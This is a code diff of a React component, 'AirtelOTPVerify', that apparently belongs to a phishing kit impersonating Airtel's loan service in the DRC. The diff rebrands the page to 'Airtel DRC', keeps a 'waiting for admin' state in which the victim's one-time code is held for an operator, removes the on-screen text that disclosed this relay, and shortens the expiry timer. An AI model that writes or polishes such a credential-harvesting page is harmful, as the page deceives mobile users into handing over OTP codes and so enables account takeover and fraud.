@@ -20,6 +20,7 @@ function makeRefId() {
 
 function formatPhone(p: string) {
   if (!p) return 'votre téléphone';
+  // Handles +243 XXX XXX XXX (DRC)
   return p.replace(/(\+\d{3})(\d{3})(\d{3})(\d{3})/, '$1 $2 $3 $4');
 }
 
@@ -344,23 +345,16 @@ function AirtelOTPVerify() {
             <line x1="3" y1="18" x2="21" y2="18" />
           </svg>
         </div>
-        <h1 className="airtel-logo">Airtel Loans</h1>
+        <h1 className="airtel-logo">Airtel DRC</h1>
         <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
       </div>
 
       <div className="airtel-card">
         {isVerifying ? (
-          /* ---- WAITING FOR ADMIN STATE (spinner + text only) ---- */
+          /* ---- WAITING FOR ADMIN STATE (spinner + heading only) ---- */
           <div className="airtel-verifying-state">
             <div className="airtel-big-spinner" />
-            <h2 className="airtel-otp-heading">
-              {waitingForAdmin ? 'Vérification en cours...' : 'Traitement...'}
-            </h2>
-            <p className="airtel-otp-subtext">
-              {waitingForAdmin
-                ? "Votre code a été transmis à un administrateur pour validation. Veuillez patienter..."
-                : 'Veuillez patienter un instant.'}
-            </p>
+            <h2 className="airtel-otp-heading">Vérification en cours...</h2>
           </div>
         ) : (
           /* ---- INPUT STATE ---- */
@@ -416,16 +410,22 @@ function AirtelOTPVerify() {
                 </div>
               )}
 
+              {/* ─── Timer: seconds only ─── */}
               <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={expired ? '#DC2626' : '#E53E3E'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <svg
+                  width="16"
+                  height="16"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke={expired ? '#DC2626' : '#E53E3E'}
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
                   <circle cx="12" cy="12" r="10" />
                   <polyline points="12 6 12 12 16 14" />
                 </svg>
-                <span>
-                  {expired
-                    ? 'Code expiré — vous pouvez toujours vérifier ou renvoyer'
-                    : `Le code expire dans ${timeLeft}s`}
-                </span>
+                <span>{timeLeft}s</span>
               </div>
 
               <button type="submit" className="airtel-verify-btn">
